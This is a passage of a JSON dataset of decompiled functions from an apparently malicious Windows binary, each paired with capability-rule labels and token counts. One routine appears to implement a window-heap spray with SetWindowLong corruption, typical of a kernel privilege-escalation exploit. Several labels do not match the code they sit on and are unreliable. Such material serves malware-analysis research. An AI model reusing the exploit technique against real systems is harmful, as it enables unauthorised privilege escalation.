        "decompiled_code": "\nvoid __cdecl fcn.004065a7(uint arg_8h, uint arg_ch)\n\n{\n    uint var_4h;\n    \n    var_4h = fcn.004095c4();\n    fcn.00406459(arg_8h, &var_4h);\n    return;\n}\n",
        "token_count": 66
    },
    "00405012": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405012(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t in_EAX;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint var_58h;\n    uint var_50h;\n    uint var_48h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_10h = 0x89abcdef;\n    var_ch = 0x1234567;\n    if (0 < param_1 * 0x10) {\n        var_8h = (param_1 * 0x10 - 1U >> 4) + 1;\n        puVar2 = in_EAX + 0x1d0;\n        do {\n            uVar4 = puVar2[-0x47] & puVar2[1] ^ puVar2[0x1b] & puVar2[0x15] ^ puVar2[-0x73] ^ puVar2[0x1d] ^ var_ch;\n            uVar3 = puVar2[-0x48] & *puVar2 ^ puVar2[0x1a] & puVar2[0x14] ^ puVar2[-0x74] ^ puVar2[0x1c] ^ var_10h;\n            uVar3 = uVar3 ^ (uVar3 >> 10 | uVar4 << 0x16);\n            uVar4 = uVar4 ^ uVar4 >> 10;\n            puVar2[0x3f] = (uVar4 << 0xb | uVar3 >> 0x15) ^ uVar4;\n            uVar4 = puVar2[-0x46] & puVar2[2] ^ puVar2[0x1c] & puVar2[0x16] ^ puVar2[-0x72] ^ puVar2[0x1e] ^ var_10h;\n            uVar5 = puVar2[-0x45] & puVar2[3] ^ puVar2[0x1d] & puVar2[0x17] ^ puVar2[-0x71] ^ puVar2[0x1f] ^ var_ch;\n            puVar2[0x3e] = uVar3 << 0xb ^ uVar3;\n            uVar4 = uVar4 ^ (uVar4 >> 5 | uVar5 << 0x1b);\n            uVar5 = uVar5 ^ uVar5 >> 5;\n            puVar1 = puVar2 + 0x20;\n            puVar2[0x40] = uVar4 << 0x18 ^ uVar4;\n            puVar2[0x41] = (uVar5 << 0x18 | uVar4 >> 8) ^ uVar5;\n            uVar3 = puVar2[0x21];\n            uVar4 = puVar2[-0x44] & puVar2[4] ^ puVar2[0x18] & puVar2[0x1e] ^ puVar2[-0x70] ^ *puVar1 ^ var_10h;\n            uVar6 = puVar2[-0x43] & puVar2[5] ^ puVar2[0x19] & puVar2[0x1f] ^ puVar2[-0x6f] ^ uVar3 ^ var_ch;\n            uVar4 = uVar4 ^ (uVar4 >> 0xd | uVar6 << 0x13);\n            uVar6 = uVar6 ^ uVar6 >> 0xd;\n            puVar2[0x42] = uVar4 << 9 ^ uVar4;\n            uVar5 = puVar2[-0x42] & puVar2[6] ^ puVar2[0x1a] & *puVar1 ^ puVar2[-0x6e] ^ puVar2[0x22] ^ var_10h;\n            uVar7 = puVar2[-0x41] & puVar2[7] ^ puVar2[0x1b] & uVar3 ^ puVar2[-0x6d] ^ puVar2[0x23] ^ var_ch;\n            puVar2[0x43] = (uVar6 << 9 | uVar4 >> 0x17) ^ uVar6;\n            uVar5 = uVar5 ^ (uVar5 >> 10 | uVar7 << 0x16);\n            uVar7 = uVar7 ^ uVar7 >> 10;\n            puVar2[0x44] = uVar5 << 0x10 ^ uVar5;\n            uVar4 = puVar2[-0x40] & puVar2[8] ^ puVar2[0x1c] & puVar2[0x22] ^ puVar2[-0x6c] ^ puVar2[0x24] ^ var_10h;\n            uVar6 = puVar2[-0x3f] & puVar2[9] ^ puVar2[0x1d] & puVar2[0x23] ^ puVar2[-0x6b] ^ puVar2[0x25] ^ var_ch;\n            puVar2[0x45] = (uVar7 << 0x10 | uVar5 >> 0x10) ^ uVar7;\n            uVar4 = uVar4 ^ (uVar4 >> 0xb | uVar6 << 0x15);\n            uVar6 = uVar6 ^ uVar6 >> 0xb;\n            puVar2[0x46] = uVar4 << 0xf ^ uVar4;\n            puVar2[0x47] = (uVar6 << 0xf | uVar4 >> 0x11) ^ uVar6;\n            uVar4 = puVar2[0x26];\n            uVar6 = puVar2[-0x3d] & puVar2[0xb] ^ puVar2[0x25] & puVar2[0x1f] ^ puVar2[-0x69] ^ puVar2[0x27] ^ var_ch;\n            uVar5 = puVar2[-0x3e] & puVar2[10] ^ puVar2[0x24] & puVar2[0x1e] ^ puVar2[-0x6a] ^ uVar4 ^ var_10h;\n            uVar5 = uVar5 ^ (uVar5 >> 0xc | uVar6 << 0x14);\n            uVar6 = uVar6 ^ uVar6 >> 0xc;\n            puVar2[0x49] = (uVar6 << 9 | uVar5 >> 0x17) ^ uVar6;\n            puVar2[0x48] = uVar5 << 9 ^ uVar5;\n            uVar5 = puVar2[-0x3c] & puVar2[0xc] ^ uVar4 & *puVar1 ^ puVar2[-0x68] ^ puVar2[0x28] ^ var_10h;\n            uVar3 = puVar2[-0x3b] & puVar2[0xd] ^ puVar2[0x27] & uVar3 ^ puVar2[-0x67] ^ puVar2[0x29] ^ var_ch;\n            uVar5 = uVar5 ^ (uVar5 >> 2 | uVar3 << 0x1e);\n            uVar3 = uVar3 ^ uVar3 >> 2;\n            puVar2[0x4a] = uVar5 << 0x1b ^ uVar5;\n            puVar2[0x4b] = (uVar3 << 0x1b | uVar5 >> 5) ^ uVar3;\n            uVar6 = puVar2[-0x3a] & puVar2[0xe] ^ puVar2[0x28] & puVar2[0x22] ^ puVar2[-0x66] ^ puVar2[0x2a] ^ var_10h;\n            uVar7 = puVar2[-0x39] & puVar2[0xf] ^ puVar2[0x29] & puVar2[0x23] ^ puVar2[-0x65] ^ puVar2[0x2b] ^ var_ch;\n            uVar6 = uVar6 ^ (uVar6 >> 7 | uVar7 << 0x19);\n            uVar7 = uVar7 ^ uVar7 >> 7;\n            uVar3 = puVar2[0x2c];\n            uVar5 = puVar2[0x2d];\n            puVar2[0x4c] = uVar6 << 0xf ^ uVar6;\n            puVar2[0x4d] = (uVar7 << 0xf | uVar6 >> 0x11) ^ uVar7;\n            uVar6 = puVar2[-0x38] & puVar2[0x10] ^ puVar2[0x2a] & puVar2[0x24] ^ puVar2[-100] ^ uVar3 ^ var_10h;\n            uVar7 = puVar2[-0x37] & puVar2[0x11] ^ puVar2[0x2b] & puVar2[0x25] ^ puVar2[-99] ^ uVar5 ^ var_ch;\n            uVar6 = uVar6 ^ (uVar6 >> 0xe | uVar7 << 0x12);\n            uVar7 = uVar7 ^ uVar7 >> 0xe;\n            puVar2[0x4e] = uVar6 << 6 ^ uVar6;\n            uVar4 = puVar2[-0x36] & puVar2[0x12] ^ uVar3 & uVar4 ^ puVar2[-0x62] ^ puVar2[0x2e] ^ var_10h;\n            puVar2[0x4f] = (uVar7 << 6 | uVar6 >> 0x1a) ^ uVar7;\n            uVar6 = puVar2[-0x35] & puVar2[0x13] ^ uVar5 & puVar2[0x27] ^ puVar2[-0x61] ^ puVar2[0x2f] ^ var_ch;\n            uVar4 = uVar4 ^ (uVar4 >> 0xf | uVar6 << 0x11);\n            uVar6 = uVar6 ^ uVar6 >> 0xf;\n            puVar2[0x50] = uVar4 << 2 ^ uVar4;\n            puVar2[0x51] = (uVar6 << 2 | uVar4 >> 0x1e) ^ uVar6;\n            uVar4 = puVar2[-0x34] & puVar2[0x14] ^ puVar2[0x2e] & puVar2[0x28] ^ puVar2[-0x60] ^ puVar2[0x30] ^ var_10h;\n            uVar6 = puVar2[-0x33] & puVar2[0x15] ^ puVar2[0x2f] & puVar2[0x29] ^ puVar2[-0x5f] ^ puVar2[0x31] ^ var_ch;\n            uVar4 = uVar4 ^ (uVar4 >> 7 | uVar6 << 0x19);\n            uVar6 = uVar6 ^ uVar6 >> 7;\n            puVar2[0x52] = uVar4 << 0x1d ^ uVar4;\n            puVar2[0x53] = (uVar6 << 0x1d | uVar4 >> 3) ^ uVar6;\n            uVar4 = puVar2[-0x32] & puVar2[0x16] ^ puVar2[0x30] & puVar2[0x2a] ^ puVar2[-0x5e] ^ puVar2[0x32] ^ var_10h;\n            uVar6 = puVar2[-0x31] & puVar2[0x17] ^ puVar2[0x31] & puVar2[0x2b] ^ puVar2[-0x5d] ^ puVar2[0x33] ^ var_ch;\n            uVar4 = uVar4 ^ (uVar4 >> 0xd | uVar6 << 0x13);\n            uVar6 = uVar6 ^ uVar6 >> 0xd;\n            puVar2[0x54] = uVar4 << 8 ^ uVar4;\n            uVar3 = puVar2[-0x30] & puVar2[0x18] ^ uVar3 & puVar2[0x32] ^ puVar2[-0x5c] ^ puVar2[0x34] ^ var_10h;\n            puVar2[0x55] = (uVar6 << 8 | uVar4 >> 0x18) ^ uVar6;\n            uVar4 = puVar2[-0x2f] & puVar2[0x19] ^ uVar5 & puVar2[0x33] ^ puVar2[-0x5b] ^ puVar2[0x35] ^ var_ch;\n            uVar3 = uVar3 ^ (uVar3 >> 0xb | uVar4 << 0x15);\n            uVar4 = uVar4 ^ uVar4 >> 0xb;\n            puVar2[0x57] = (uVar4 << 0xf | uVar3 >> 0x11) ^ uVar4;\n            puVar2[0x56] = uVar3 << 0xf ^ uVar3;\n            uVar3 = puVar2[-0x2e] & puVar2[0x1a] ^ puVar2[0x34] & puVar2[0x2e] ^ puVar2[-0x5a] ^ puVar2[0x36] ^ var_10h;\n            uVar4 = puVar2[-0x2d] & puVar2[0x1b] ^ puVar2[0x35] & puVar2[0x2f] ^ puVar2[-0x59] ^ puVar2[0x37] ^ var_ch;\n            uVar3 = uVar3 ^ (uVar3 >> 7 | uVar4 << 0x19);\n            uVar4 = uVar4 ^ uVar4 >> 7;\n            puVar2[0x59] = (uVar4 << 5 | uVar3 >> 0x1b) ^ uVar4;\n            puVar2[0x58] = uVar3 << 5 ^ uVar3;\n            uVar3 = puVar2[-0x2c] & puVar2[0x1c] ^ puVar2[0x36] & puVar2[0x30] ^ puVar2[-0x58] ^ puVar2[0x38] ^ var_10h;\n            uVar4 = puVar2[-0x2b] & puVar2[0x1d] ^ puVar2[0x37] & puVar2[0x31] ^ puVar2[-0x57] ^ puVar2[0x39] ^ var_ch;\n            uVar3 = uVar3 ^ (uVar3 >> 6 | uVar4 << 0x1a);\n            uVar4 = uVar4 ^ uVar4 >> 6;\n            puVar2[0x5b] = (uVar4 << 0x1f | uVar3 >> 1) ^ uVar4;\n            puVar2[0x5a] = uVar3 << 0x1f ^ uVar3;\n            uVar3 = puVar2[-0x2a] & puVar2[0x1e] ^ puVar2[0x38] & puVar2[0x32] ^ puVar2[-0x56] ^ puVar2[0x3a] ^ var_10h;\n            uVar4 = puVar2[-0x29] & puVar2[0x1f] ^ puVar2[0x39] & puVar2[0x33] ^ puVar2[-0x55] ^ puVar2[0x3b] ^ var_ch;\n            uVar3 = uVar3 ^ (uVar3 >> 0xc | uVar4 << 0x14);\n            uVar4 = uVar4 ^ uVar4 >> 0xc;\n            puVar2[0x5c] = uVar3 << 9 ^ uVar3;\n            puVar2[0x5d] = (uVar4 << 9 | uVar3 >> 0x17) ^ uVar4;\n            uVar3 = var_10h >> 0x1f;\n            var_10h = var_10h & 0x2425cfa0 ^ var_ch >> 0x1f ^ var_10h * 2;\n            var_ch = var_ch & 0x7311c281 ^ (var_ch << 1 | uVar3);\n            var_8h = var_8h + -1;\n            puVar2 = puVar1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 4031
    },
    "0040681d": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\nuint fcn.0040681d(uint param_1, uint32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint32_t uVar2;\n    uint extraout_EDX;\n    \n    *0x413a51 = 0;\n    fcn.00406801();\n    uVar2 = extraout_ECX;\n    while (uVar2 < param_2) {\n        fcn.00406801();\n        fcn.00406801();\n        uVar2 = extraout_ECX_00 + 1;\n    }\n    uVar1 = fcn.00406817();\n    *0x413a51 = *0x413a51 & uVar1;\n    return extraout_EDX;\n}\n",
        "token_count": 179
    },
    "00403b40": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint fcn.00403b40(uint32_t param_1)\n\n{\n    int32_t arg_8h;\n    uint *in_EAX;\n    uint uVar1;\n    \n    if (in_EAX[1] <= param_1 >> 5) {\n        arg_8h = (param_1 >> 5) + 1;\n        fcn.004038a3(arg_8h);\n        in_EAX[1] = arg_8h;\n    }\n    fcn.00404574(*in_EAX, in_EAX[1]);\n    uVar1 = fcn.0040435e(*in_EAX);\n    in_EAX[1] = uVar1;\n    return 0;\n}\n",
        "token_count": 157
    },
    "00403b8f": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint fcn.00403b8f(uint param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t arg_8h;\n    int32_t unaff_EDI;\n    \n    arg_8h = unaff_EDI + 0x1fU >> 5;\n    fcn.004038a3(arg_8h);\n    fcn.004063f9(*in_EAX, arg_8h << 2, param_1, 4);\n    uVar3 = 1;\n    for (uVar2 = unaff_EDI - 1U & 0x1f; uVar2 != 0; uVar2 = uVar2 - 1) {\n        uVar3 = uVar3 | uVar3 * 2;\n    }\n    puVar1 = *in_EAX + -4 + arg_8h * 4;\n    *puVar1 = *puVar1 & uVar3;\n    in_EAX[1] = arg_8h;\n    return 0;\n}\n",
        "token_count": 253
    },
    "00404574": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nuint __thiscall fcn.00404574(uint32_t param_1, int32_t param_2, uint32_t param_3)\n\n{\n    uint32_t *puVar1;\n    \n    if (param_3 <= param_1 >> 5) {\n        return 0xffffffff;\n    }\n    puVar1 = param_2 + (param_1 >> 5) * 4;\n    *puVar1 = *puVar1 | 1 << (param_1 & 0x1f);\n    return 0;\n}\n",
        "token_count": 118
    },
    "00403bfe": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00403bfe(uint32_t param_1)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *unaff_ESI;\n    uint var_4h;\n    \n    uVar1 = (param_1 & 0xffff) * (in_EAX >> 0x10);\n    uVar2 = (param_1 >> 0x10) * (in_EAX & 0xffff) + uVar1;\n    uVar4 = (param_1 & 0xffff) * (in_EAX & 0xffff) + uVar2 * 0x10000;\n    iVar3 = (uVar2 < uVar1) * 0x10000 + (uVar2 >> 0x10);\n    *unaff_ESI = uVar4;\n    if (uVar4 < uVar2 * 0x10000) {\n        iVar3 = iVar3 + 1;\n    }\n    unaff_ESI[1] = (param_1 >> 0x10) * (in_EAX >> 0x10) + iVar3;\n    return 0;\n}\n",
        "token_count": 277
    },
    "00403c52": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403c52(uint param_1, int32_t param_2, int32_t param_3, int32_t param_4)\n\n{\n    uint32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = param_2 * param_4 + param_2 * param_3 * 0x10000;\n    *in_EAX = *in_EAX - iVar1;\n    uVar2 = -iVar1 - 1;\n    if (uVar2 <= *in_EAX && *in_EAX != uVar2) {\n        in_EAX[1] = in_EAX[1] - 1;\n    }\n    in_EAX[1] = in_EAX[1] - (param_2 * param_3 >> 0x10);\n    return;\n}\n",
        "token_count": 190
    },
    "00403c7e": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403d75)\n// WARNING: Removing unreachable block (ram,0x00403cfb)\n// WARNING: Removing unreachable block (ram,0x00403df1)\n\nint32_t __cdecl fcn.00403c7e(uint32_t *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h < 0) {\n        uVar1 = *in_EAX;\n        uVar2 = *in_EAX;\n        uVar7 = *(in_EAX + 2);\n        uVar8 = arg_10h & 0xffff;\n        arg_10h = arg_10h >> 0x10;\n        iVar5 = -(*(in_EAX + 6) < arg_10h);\n        iVar3 = iVar5 + 1;\n        if ((iVar3 != 0) && (((*(in_EAX + 6) - arg_10h) * 0x10000 | *(in_EAX + 1)) < uVar8)) {\n            iVar3 = iVar5;\n        }\n        uVar6 = in_EAX[1];\n        if (iVar3 != 0) {\n            fcn.00403c52(arg_10h, uVar8);\n        }\n        uVar4 = uVar6 / arg_10h;\n        iVar5 = uVar6 - uVar4 * arg_10h;\n        if ((uVar4 == 0x10000) ||\n           (uVar9 = iVar5 * 0x10000 | uVar7,  uVar10 = uVar4,  uVar9 <= uVar4 * uVar8 && uVar4 * uVar8 - uVar9 != 0)) {\n            uVar9 = iVar5 + arg_10h;\n            uVar10 = uVar4 - 1;\n            if ((uVar9 < 0x10000) &&\n               (uVar9 = uVar9 * 0x10000 | uVar7,  uVar9 <= uVar10 * uVar8 && uVar10 * uVar8 - uVar9 != 0)) {\n                uVar10 = uVar4 - 2;\n            }\n        }\n        uVar7 = uVar6 << 0x10 | uVar7;\n        fcn.00403c52(arg_10h, uVar8);\n        *arg_8h = uVar10 << 0x10;\n        uVar6 = uVar7 / arg_10h;\n        iVar5 = uVar7 - uVar6 * arg_10h;\n        if ((uVar6 == 0x10000) ||\n           (uVar4 = iVar5 * 0x10000 | uVar1,  uVar7 = uVar6,  uVar4 <= uVar6 * uVar8 && uVar6 * uVar8 - uVar4 != 0)) {\n            uVar4 = iVar5 + arg_10h;\n            uVar7 = uVar6 - 1;\n            if ((uVar4 < 0x10000) &&\n               (uVar4 = uVar4 * 0x10000 | uVar1,  uVar4 <= uVar7 * uVar8 && uVar7 * uVar8 - uVar4 != 0)) {\n                uVar7 = uVar6 - 2;\n            }\n        }\n        fcn.00403c52(arg_10h, uVar8);\n        *arg_8h = *arg_8h | uVar7 & 0xffff;\n        *arg_ch = uVar2;\n    }\n    else {\n        *arg_ch = 0;\n        *arg_8h = 0;\n        iVar3 = -1;\n    }\n    return iVar3;\n}\n",
        "token_count": 956
    },
    "00405a5a": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nulong fcn.00405a5a(uint32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar1 = param_2 << 0x10;\n    uVar3 = (param_1 ^ param_2) >> 0x10 ^ (param_1 << 0x10 | param_2 >> 0x10);\n    uVar2 = param_2 >> 0x10 ^ uVar1;\n    return CONCAT44((uVar3 >> 8 ^ (uVar3 << 8 | uVar1 >> 0x18)) & 0xff00ff ^ (uVar3 << 8 | uVar1 >> 0x18), \n                    (uVar2 >> 8 ^ uVar2 << 8) & 0xff00ff ^ uVar2 << 8);\n}\n",
        "token_count": 206
    },
    "004092fa": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nbool fcn.004092fa(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    bool bVar3;\n    uint *s1;\n    uint var_34h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    \n    bVar3 = false;\n    cVar1 = fcn.00408dfb(0x434590, 0x11c);\n    if (cVar1 != '\\0') {\n        bVar3 = true;\n        *0x434590 = 0x11c;\n        iVar2 = (**0x413470)(0x434590);\n        if (iVar2 == 0) {\n            *0x434590 = 0x114;\n            iVar2 = (**0x413470)(0x434590);\n            bVar3 = iVar2 != 0;\n            if (!bVar3) {\n                return bVar3;\n            }\n        }\n        s1 = &var_34h;\n        arg_8h = fcn.00407c1d(0x412118, 0xc, 0xf1f0a383);\n        fcn.00409275(arg_8h, s1);\n        *0x434594 = var_2ch >> 0x10;\n        *0x434598 = var_2ch & 0xffff;\n        *0x43459c = var_28h >> 0x10;\n    }\n    return bVar3;\n}\n",
        "token_count": 330
    },
    "0040fd75": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0040fd75(uint32_t param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    \n    if ((in_EAX & 3) != 0) {\n        uVar1 = in_EAX >> (('\\x04' - (in_EAX & 3)) * '\\b' & 0x1fU);\n        param_1 = param_1 ^ (uVar1 * 0x16a88000 | uVar1 * -0x3361d2af >> 0x11) * 0x1b873593;\n    }\n    uVar1 = ((param_1 ^ param_2) >> 0x10 ^ param_1 ^ param_2) * -0x7a143595;\n    uVar1 = (uVar1 >> 0xd ^ uVar1) * -0x3d4d51cb;\n    return uVar1 >> 0x10 ^ uVar1;\n}\n",
        "token_count": 229
    },
    "00405846": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00405846(uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    arg_ch = (in_EAX << 8 | arg_8h) << 4 | arg_ch;\n    uVar1 = arg_ch << 0x10 | arg_10h;\n    uVar2 = uVar1 << 8 | arg_14h;\n    return CONCAT44(arg_18h >> 0x1f |\n                    ((arg_ch >> 0x10 | arg_10h >> 0x1f) << 8 | uVar1 >> 0x18 | arg_14h >> 0x1f) << 0xc | uVar2 >> 0x14, \n                    arg_18h | uVar2 << 0xc);\n}\n",
        "token_count": 223
    },
    "0040d60d": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040d60d(void)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint var_c14h;\n    uint var_446h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    char16_t *var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    \n    if ((*0x4347d8 != 0) && (*0x4347dc != 0)) {\n        puVar7 = &var_c14h;\n        for (iVar5 = 100; iVar5 != 0; iVar5 = iVar5 + -1) {\n            *puVar7 = 0x610061;\n            puVar7 = puVar7 + 1;\n        }\n        var_446h._0_2_ = 0;\n        var_38h = *0x413094;\n        var_2ch = *0x43470c;\n        var_40h = 0x30;\n        var_3ch = 0;\n        var_34h = 0;\n        var_30h = 0;\n        var_28h = 0;\n        var_24h = 0;\n        var_20h = 0;\n        var_1ch = 0;\n        var_18h = L\"MyExtraWnd\";\n        var_14h = 0;\n        iVar4 = (**0x4130c8)(&var_40h);\n        if (iVar4 != 0) {\n            sub.ntdll.dll_memset(&var_446h + 2, 0, 0x400);\n            var_8h = 0;\n            do {\n                iVar5 = (**0x413090)(0, L\"MyExtraWnd\", &var_c14h, 0, 0, 0, 0, 0, 0, 0, *0x43470c, 0);\n                *(&var_446h + var_8h * 4 + 2) = iVar5;\n                if (iVar5 == 0) break;\n                var_8h = var_8h + 1;\n            } while (var_8h < 0x100);\n            var_ch = 0;\n            do {\n                uVar6 = 0;\n                do {\n                    iVar5 = fcn.0040d168(*(&var_446h + var_ch * 4 + 2));\n                    uVar1 = *(iVar5 + 0x10);\n                    iVar5 = fcn.0040d168(*(&var_446h + uVar6 * 4 + 2));\n                    var_10h = *(iVar5 + 0x10);\n                    if ((uVar1 < var_10h) && (var_10h + 0x300 < uVar1 + 0x40000)) {\n                        *0x4347f4 = *(&var_446h + var_ch * 4 + 2);\n                        iVar5 = *(&var_446h + uVar6 * 4 + 2);\n                        *0x434800 = iVar5;\n                        *0x4347f8 = fcn.0040d168(*(&var_446h + var_ch * 4 + 2));\n                        *0x434804 = fcn.0040d168(iVar5);\n                        *0x434808 = var_10h;\n                        *0x434810 = *(*0x4347f8 + 8);\n                        *0x43480c = uVar1 + *0x4347d8 + -4;\n                        *0x4347fc = uVar1;\n                        break;\n                    }\n                    uVar6 = uVar6 + 1;\n                } while (uVar6 <= var_8h);\n            } while (((*0x4347f4 == 0) || (*0x434800 == 0)) && (var_ch = var_ch + 1,  var_ch <= var_8h));\n            uVar6 = 0;\n            do {\n                iVar5 = *(&var_446h + uVar6 * 4 + 2);\n                if ((iVar5 != *0x4347f4) && (iVar5 != *0x434800)) {\n                    (*_sym.imp.USER32.dll_DestroyWindow)(iVar5);\n                }\n                pcVar3 = _sym.imp.USER32.dll_SetWindowLongW;\n                pcVar2 = _sym.imp.USER32.dll_keybd_event;\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < 0x100);\n            if ((*0x4347f4 != 0) && (*0x434800 != 0)) {\n                do {\n                    if (*0x434814 != 0) {\n                        return *0x434814;\n                    }\n                    if (*0x4139a8 <= *0x43481c) {\n                        return 0;\n                    }\n                    *0x434700 = 0;\n                    *0x434704 = 0;\n                    *0x434708 = 0;\n                    var_8h = 0;\n                    *0x43384c = (**0x413474)(0, 0, fcn.0040c0f0, 0, 0, 0);\n                    do {\n                        if (*0x434708 != 0) break;\n                        var_8h = var_8h + 1;\n                        (**0x41347c)(0x32);\n                    } while (var_8h < 0x14);\n                    if (var_8h < 0x14) {\n                        *0x434704 = (**0x413090)(0x80000, L\"MyMainWnd\", 0, 0x10000000, *0x413a48 + 1, *0x413a4c + 1, 1, \n                                                 1, 0, 0, *0x43470c, 0);\n                        if (*0x434704 != 0) {\n                            uVar6 = (*_sym.imp.USER32.dll_GetWindowLongW)(*0x434704, 0xfffffff0);\n                            (*pcVar3)(*0x434704, 0xfffffff0, uVar6 | 0x40000000);\n                            (*pcVar3)(*0x434704, 0xfffffff4, *0x4347fc + *0x4347dc + -0x11);\n                            (*pcVar2)(0x12, 0, 0, 0);\n                            (*pcVar2)(0x1b, 0, 0, 0);\n                            (*pcVar2)(0x1b, 0, 2, 0);\n                            (*pcVar2)(0x12, 0, 2, 0);\n                            (**0x41347c)(100);\n                        }\n                        (*_sym.imp.USER32.dll_DestroyWindow)(*0x434700);\n                        (*_sym.imp.USER32.dll_DestroyWindow)(*0x434704);\n                        (**0x413510)(*0x43384c, 0xffffffff);\n                        (**0x4134ac)(*0x43384c, 0xffffffff);\n                        if ((*0x434814 == 0) && (0x3ffffff < *(*0x4347f8 + *0x4347dc))) {\n                            *0x434814 = fcn.0040d3a1();\n                        }\n                    }\n                    else {\n                        (*_sym.imp.USER32.dll_DestroyWindow)(*0x434700);\n                        (*_sym.imp.USER32.dll_DestroyWindow)(*0x434704);\n                        (**0x413510)(*0x43384c, 0xffffffff);\n                    }\n                    *0x43481c = *0x43481c + 1;\n                } while( true );\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1824
    },
    "00406079": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.00406079(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t *unaff_ESI;\n    int32_t iVar4;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *unaff_ESI + 7;\n    iVar4 = (iVar4 >> 0x1f & 7U) + iVar4 >> 3;\n    uVar2 = *unaff_ESI & 0x80000007;\n    if (uVar2 < 0) {\n        uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n    }\n    if (0 < iVar4) {\n        puVar1 = unaff_ESI + 2;\n        var_ch = iVar4;\n        do {\n            *puVar1 = *((0x80 - iVar4) + puVar1);\n            puVar1 = puVar1 + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    if (iVar4 < 0x80) {\n        sub.ntdll.dll_memset(iVar4 + 8 + unaff_ESI, 0, 0x80 - iVar4);\n    }\n    if ((0 < uVar2) && (0 < iVar4)) {\n        puVar1 = unaff_ESI + 2;\n        do {\n            uVar3 = *puVar1 << (8 - uVar2 & 0x1f);\n            *puVar1 = uVar3;\n            if ((-7 - unaff_ESI) + puVar1 < 0x80) 